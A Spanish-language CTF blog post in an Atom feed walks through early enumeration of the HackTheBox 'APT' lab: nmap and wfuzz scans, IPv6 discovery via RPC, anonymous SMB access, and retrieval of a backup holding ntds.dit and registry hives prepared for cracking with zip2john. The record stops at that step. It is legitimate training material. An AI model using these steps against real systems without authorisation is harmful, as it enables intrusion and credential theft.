<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-14T13:37:46-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolucion de CTFs y ciberseguridad.
</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - APT (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html" rel="alternate" type="text/html" title="HackTheBox - APT (insane)" /><published>2024-04-14T00:00:00-06:00</published><updated>2024-04-14T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/bbf0ca0388599663e0d8b6955a0760d3.png" />
</p>

<ul>
  <li>En este post vamos a estar haciendo la maquina APT de la plataforma de Hack The Box donde mediante una enumeración por RPC encontramos que se esta empleando IPV6 en la maquina victima a partir de eso conoceremos la dirección IP y comenzaremos a enumerar por smb donde encontraremos un .zip que vamos a crackear, vamos a estar empleando kerbrute para validar usuarios, vamos a leer registros de la maquina, vamos a hacer un bypass al antivirus para poder correr el winpeas y en esta maquina vamos a estar jugando con un hash NTLMv1.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135 10.129.96.60 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 19:00 CST
Nmap scan report <span class="k">for </span>10.129.96.60
Host is up <span class="o">(</span>0.092s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-title: Gigantic Hosting | Home
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto que esta corriendo un servicio <strong>http</strong> eso significa que hay una pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span> <span class="o">-</span><span class="n">v</span>
<span class="no">WhatWeb</span> <span class="n">report</span> <span class="k">for</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span>
<span class="no">Status</span>    <span class="p">:</span> <span class="mi">200</span> <span class="no">OK</span>
<span class="no">Title</span>     <span class="p">:</span> <span class="no">Gigantic</span> <span class="no">Hosting</span> <span class="o">|</span> <span class="no">Home</span>
<span class="no">IP</span>        <span class="p">:</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span>
<span class="no">Country</span>   <span class="p">:</span> <span class="no">RESERVED</span><span class="p">,</span> <span class="no">ZZ</span>

<span class="no">Summary</span>   <span class="p">:</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Email</span><span class="p">[</span><span class="n">sales</span><span class="vi">@gigantichosting</span><span class="p">.</span><span class="nf">com</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">,</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">javascript</span><span class="p">,</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">]</span>

<span class="no">Detected</span> <span class="no">Plugins</span><span class="p">:</span>
<span class="p">[</span> <span class="no">Bootstrap</span> <span class="p">]</span>
	<span class="no">Bootstrap</span> <span class="n">is</span> <span class="n">an</span> <span class="nb">open</span> <span class="n">source</span> <span class="n">toolkit</span> <span class="k">for</span> <span class="n">developing</span> <span class="n">with</span>
	<span class="no">HTML</span><span class="p">,</span> <span class="no">CSS</span><span class="p">,</span> <span class="ow">and</span> <span class="no">JS</span><span class="o">.</span>

	<span class="no">Website</span>     <span class="p">:</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">getbootstrap</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span>

<span class="p">[</span> <span class="no">Email</span> <span class="p">]</span>
	<span class="no">Extract</span> <span class="n">email</span> <span class="n">addresses</span><span class="o">.</span> <span class="no">Find</span> <span class="n">valid</span> <span class="n">email</span> <span class="n">address</span> <span class="ow">and</span>
	<span class="n">syntactically</span> <span class="n">invalid</span> <span class="n">email</span> <span class="n">addresses</span> <span class="n">from</span> <span class="ss">mailto: </span><span class="n">link</span>
	<span class="n">tags</span><span class="o">.</span> <span class="no">We</span> <span class="n">match</span> <span class="n">syntactically</span> <span class="n">invalid</span> <span class="n">links</span> <span class="n">containing</span>
	<span class="ss">mailto: </span><span class="n">to</span> <span class="kp">catch</span> <span class="n">anti</span><span class="o">-</span><span class="n">spam</span> <span class="n">email</span> <span class="n">addresses</span><span class="p">,</span> <span class="n">eg</span><span class="p">.</span> <span class="nf">bob</span> <span class="n">at</span>
	<span class="n">gmail</span><span class="p">.</span><span class="nf">com</span><span class="o">.</span> <span class="no">This</span> <span class="n">uses</span> <span class="n">the</span> <span class="n">simplified</span> <span class="n">email</span> <span class="n">regular</span>
	<span class="n">expression</span> <span class="n">from</span>
	<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">regular</span><span class="o">-</span><span class="n">expressions</span><span class="p">.</span><span class="nf">info</span><span class="o">/</span><span class="n">email</span><span class="p">.</span><span class="nf">html</span> <span class="k">for</span> <span class="n">valid</span>
	<span class="n">email</span> <span class="n">address</span> <span class="n">matching</span><span class="o">.</span>

	<span class="no">String</span>       <span class="p">:</span> <span class="n">sales</span><span class="vi">@gigantichosting</span><span class="p">.</span><span class="nf">com</span>

<span class="p">[</span> <span class="no">HTML5</span> <span class="p">]</span>
	<span class="no">HTML</span> <span class="n">version</span> <span class="mi">5</span><span class="p">,</span> <span class="n">detected</span> <span class="n">by</span> <span class="n">the</span> <span class="n">doctype</span> <span class="n">declaration</span>


<span class="p">[</span> <span class="no">HTTPServer</span> <span class="p">]</span>
	<span class="no">HTTP</span> <span class="n">server</span> <span class="n">header</span> <span class="n">string</span><span class="o">.</span> <span class="no">This</span> <span class="n">plugin</span> <span class="n">also</span> <span class="n">attempts</span> <span class="n">to</span>
	<span class="n">identify</span> <span class="n">the</span> <span class="n">operating</span> <span class="nb">system</span> <span class="n">from</span> <span class="n">the</span> <span class="n">server</span> <span class="n">header</span><span class="o">.</span>

	<span class="no">String</span>       <span class="p">:</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span> <span class="p">(</span><span class="n">from</span> <span class="n">server</span> <span class="n">string</span><span class="p">)</span>

<span class="p">[</span> <span class="no">JQuery</span> <span class="p">]</span>
	<span class="no">A</span> <span class="n">fast</span><span class="p">,</span> <span class="n">concise</span><span class="p">,</span> <span class="no">JavaScript</span> <span class="n">that</span> <span class="n">simplifies</span> <span class="n">how</span> <span class="n">to</span> <span class="n">traverse</span>
	<span class="no">HTML</span> <span class="n">documents</span><span class="p">,</span> <span class="n">handle</span> <span class="n">events</span><span class="p">,</span> <span class="n">perform</span> <span class="n">animations</span><span class="p">,</span> <span class="ow">and</span> <span class="n">add</span>
	<span class="no">AJAX</span><span class="o">.</span>

	<span class="no">Website</span>     <span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">jquery</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span>

<span class="p">[</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span> <span class="p">]</span>
	<span class="no">Microsoft</span> <span class="no">Internet</span> <span class="no">Information</span> <span class="no">Services</span> <span class="p">(</span><span class="no">IIS</span><span class="p">)</span> <span class="k">for</span> <span class="no">Windows</span>
	<span class="no">Server</span> <span class="n">is</span> <span class="n">a</span> <span class="n">flexible</span><span class="p">,</span> <span class="n">secure</span> <span class="ow">and</span> <span class="n">easy</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">manage</span> <span class="no">Web</span> <span class="n">server</span>
	<span class="k">for</span> <span class="n">hosting</span> <span class="n">anything</span> <span class="n">on</span> <span class="n">the</span> <span class="no">Web</span><span class="o">.</span> <span class="no">From</span> <span class="n">media</span> <span class="n">streaming</span> <span class="n">to</span>
	<span class="n">web</span> <span class="n">application</span> <span class="n">hosting</span><span class="p">,</span> <span class="no">IIS</span><span class="err">'</span><span class="n">s</span> <span class="n">scalable</span> <span class="ow">and</span> <span class="nb">open</span>
	<span class="n">architecture</span> <span class="n">is</span> <span class="n">ready</span> <span class="n">to</span> <span class="n">handle</span> <span class="n">the</span> <span class="n">most</span> <span class="n">demanding</span> <span class="n">tasks</span><span class="o">.</span>

	<span class="no">Version</span>      <span class="p">:</span> <span class="mf">10.0</span>
	<span class="no">Website</span>     <span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">iis</span><span class="p">.</span><span class="nf">net</span><span class="o">/</span>

<span class="p">[</span> <span class="no">Script</span> <span class="p">]</span>
	<span class="no">This</span> <span class="n">plugin</span> <span class="n">detects</span> <span class="n">instances</span> <span class="n">of</span> <span class="n">script</span> <span class="no">HTML</span> <span class="n">elements</span> <span class="ow">and</span>
	<span class="n">returns</span> <span class="n">the</span> <span class="n">script</span> <span class="n">language</span><span class="o">/</span><span class="n">type</span><span class="o">.</span>

	<span class="no">String</span>       <span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">javascript</span><span class="p">,</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span>

<span class="no">HTTP</span> <span class="no">Headers</span><span class="p">:</span>
	<span class="no">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="no">OK</span>
	<span class="no">Content</span><span class="o">-</span><span class="no">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span>
	<span class="no">Last</span><span class="o">-</span><span class="no">Modified</span><span class="p">:</span> <span class="no">Mon</span><span class="p">,</span> <span class="mi">23</span> <span class="no">Dec</span> <span class="mi">2019</span> <span class="mi">11</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">26</span> <span class="no">GMT</span>
	<span class="no">Accept</span><span class="o">-</span><span class="no">Ranges</span><span class="p">:</span> <span class="n">bytes</span>
	<span class="no">ETag</span><span class="p">:</span> <span class="s2">"0ef5b3b84b9d51:0"</span>
	<span class="no">Server</span><span class="p">:</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span>
	<span class="no">Date</span><span class="p">:</span> <span class="no">Mon</span><span class="p">,</span> <span class="mo">01</span> <span class="no">Apr</span> <span class="mi">2024</span> <span class="mo">01</span><span class="p">:</span><span class="mo">02</span><span class="p">:</span><span class="mo">04</span> <span class="no">GMT</span>
	<span class="no">Connection</span><span class="p">:</span> <span class="n">close</span>
	<span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">14879</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/apt/1.png" />
</p>

<ul>
  <li>Vamos a seguir haciendo <strong>Fuzzing</strong> ya que la pagina web no es muy interesante y no encontré nada así que vamos a ver si la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code> nos descubre algo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.96.60/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.96.60/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000002:   301        1 L      10 W       150 Ch      "images"
000000189:   301        1 L      10 W       150 Ch      "Images"
000000536:   301        1 L      10 W       147 Ch      "css"
000000939:   301        1 L      10 W       146 Ch      "js"
000002757:   301        1 L      10 W       149 Ch      "fonts"
000003659:   301        1 L      10 W       150 Ch      "IMAGES"
000005568:   301        1 L      10 W       149 Ch      "Fonts"
000008461:   301        1 L      10 W       147 Ch      "CSS"
000009123:   301        1 L      10 W       146 Ch      "JS"
</span></code></pre></div></div>

<ul>
  <li>Bueno como tal también tenemos el protocolo <strong>RPC</strong> abierto pero no nos funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.96.60
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
</code></pre></div></div>

<ul>
  <li>
    <p>Si buscamos en <a href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc</a> como enumerar este servicio al final del post nos dejan esta herramienta <a href="https://github.com/mubix/IOXIDResolver">https://github.com/mubix/IOXIDResolver</a> ya que es posible enumerar interfaces de red con <strong>rcp</strong> <a href="https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a>.</p>
  </li>
  <li>
    <p>Vamos a clonarnos el repositorio.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/mubix/IOXIDResolver
Cloning into <span class="s1">'IOXIDResolver'</span>...
remote: Enumerating objects: 33, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>33/33<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>30/30<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 33 <span class="o">(</span>delta 12<span class="o">)</span>, reused 5 <span class="o">(</span>delta 2<span class="o">)</span>, pack-reused 0
Receiving objects: 100% <span class="o">(</span>33/33<span class="o">)</span>, 9.04 KiB | 308.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>12/12<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  content <span class="nb">cd </span>IOXIDResolver
➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">ls
</span>IOXIDResolver.py  LICENSE  README.md  requirements.txt
➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: impacket&gt;0 <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from <span class="nt">-r</span> requirements.txt <span class="o">(</span>line 1<span class="o">))</span> <span class="o">(</span>0.11.0<span class="o">)</span>
Requirement already satisfied: dsinternals <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from impacket&gt;0-&gt;-r requirements.txt <span class="o">(</span>line 1<span class="o">))</span> <span class="o">(</span>1.2.4<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si ejecutamos la herramienta solo nos piden un <strong>target</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> python3 IOXIDResolver.py <span class="nt">-h</span>
IOXIDResolver.py <span class="nt">-t</span> &lt;target&gt;
</code></pre></div></div>

<ul>
  <li>Si le damos la <strong>IP</strong> vemos que nos reporta una dirección en <strong>IPV6</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> python3 IOXIDResolver.py <span class="nt">-t</span> 10.129.96.60
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::1c3
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::5c2e:939a:a5ff:2f03
</code></pre></div></div>

<ul>
  <li>Para comprobar si la <code class="language-plaintext highlighter-rouge">ip</code> esta activa podemos lanzar un <code class="language-plaintext highlighter-rouge">ping</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> ping6 <span class="nt">-c</span> 1 dead:beef::b885:d62a:d679:573f
PING dead:beef::b885:d62a:d679:573f <span class="o">(</span>dead:beef::b885:d62a:d679:573f<span class="o">)</span> 56 data bytes
64 bytes from dead:beef::b885:d62a:d679:573f: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>90.1 ms

<span class="nt">---</span> dead:beef::b885:d62a:d679:573f ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 90.110/90.110/90.110/0.000 ms
</code></pre></div></div>

<h1 id="portscan-ipv6">PortScan ipv6</h1>

<ul>
  <li>Ahora lo que podemos hacer es un escaneo con <code class="language-plaintext highlighter-rouge">Nmap</code> para ver los puertos abiertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49689,63855 <span class="nt">-6</span> dead:beef::b885:d62a:d679:573f <span class="nt">-oN</span> targeted2
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 19:35 CST
Nmap scan report <span class="k">for </span>dead:beef::b885:d62a:d679:573f
Host is up <span class="o">(</span>0.094s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-server-header:
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-01 01:35:24Z<span class="o">)</span>
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  msrpc        Microsoft Windows RPC
49689/tcp open  msrpc        Microsoft Windows RPC
63855/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: APT<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: <span class="nt">-8m34s</span>, deviation: 22m38s, median: <span class="nt">-1s</span>
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
|   Computer name: apt
|   NetBIOS computer name: APT<span class="se">\x</span>00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System <span class="nb">time</span>: 2024-04-01T02:36:24+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-01T01:36:25
|_  start_date: 2024-04-01T00:50:55
</code></pre></div></div>

<h2 id="enumeración-ipv6">Enumeración IPV6</h2>

<ul>
  <li>Vemos que estamos ante un <strong>Windows Server 2016 Standard</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb dead:beef::b885:d62a:d679:573f
SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar el dominio al <code class="language-plaintext highlighter-rouge">/etc/hots</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"dead:beef::b885:d62a:d679:573f apt apt.local.htb htb.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
dead:beef::b885:d62a:d679:573f apt apt.local.htb htb.local
</code></pre></div></div>

<ul>
  <li>Vamos a enumerar recursos compartidos a nivel de red aprovechando que el servicio de <strong>smb</strong> esta abierto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient <span class="nt">-L</span> apt <span class="nt">-N</span>
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	backup          Disk
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
apt is an IPv6 address <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>El recurso <strong>backup</strong> es interesante vamos a conectarnos al recurso compartido y ver lo que hay adentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient //apt/backup <span class="nt">-N</span>
Anonymous login successful
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Thu Sep 24 02:30:52 2020
  ..                                  D        0  Thu Sep 24 02:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 02:30:32 2020

		5114623 blocks of size 4096. 2634373 blocks available
smb: <span class="se">\&gt;</span> get backup.zip
getting file <span class="se">\b</span>ackup.zip of size 10650961 as backup.zip <span class="o">(</span>1647.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1647.9 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos un <code class="language-plaintext highlighter-rouge">.zip</code> y tiene esto dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l backup.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 10650961 bytes <span class="o">(</span>11 MiB<span class="o">)</span>

Listing archive: backup.zip

<span class="nt">--</span>
Path <span class="o">=</span> backup.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 10650961

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2020-09-23 11:40:25 D....            0            0  Active Directory
2020-09-23 11:38:20 .....     50331648      8483543  Active Directory/ntds.dit
2020-09-23 11:38:20 .....        16384          342  Active Directory/ntds.jfm
2020-09-23 11:40:25 D....            0            0  registry
2020-09-23 11:22:12 .....       262144         8522  registry/SECURITY
2020-09-23 11:22:12 .....     12582912      2157644  registry/SYSTEM
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2020-09-23 11:40:25           63193088     10650051  4 files, 2 folders
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos archivos <code class="language-plaintext highlighter-rouge">ntds</code> <a href="https://docs.iwolfsec.com/tecnicas-y-ataques/ataques-a-directorio-activo/credenciales/dumping-active-directory-hashes-ntds.dit">https://docs.iwolfsec.com/tecnicas-y-ataques/ataques-a-directorio-activo/credenciales/dumping-active-directory-hashes-ntds.dit</a> aquí se almacenan los hashes <code class="language-plaintext highlighter-rouge">NTLM</code>, usuarios, grupos, miembros de un grupo y mas.</p>
  </li>
  <li>
    <p>Bueno nos pide contraseña.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip backup.zip
Archive:  backup.zip
   creating: Active Directory/
<span class="o">[</span>backup.zip] Active Directory/ntds.dit password:
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">zip2john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content zip2john backup.zip <span class="o">&gt;</span> <span class="nb">hash
</span>ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression <span class="nb">type
</span>ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>8483543, <span class="nv">decmplen</span><span class="o">=</span>50331648, <span class="nv">crc</span><span class="o">=</span>ACD0B2FB <span class="nv">ts</span><span class="o">=</span>9CCA <span class="nv">cs</span><span class="o">=</span>acd0 <span class="nb">type</span><span class="o">=</span>8
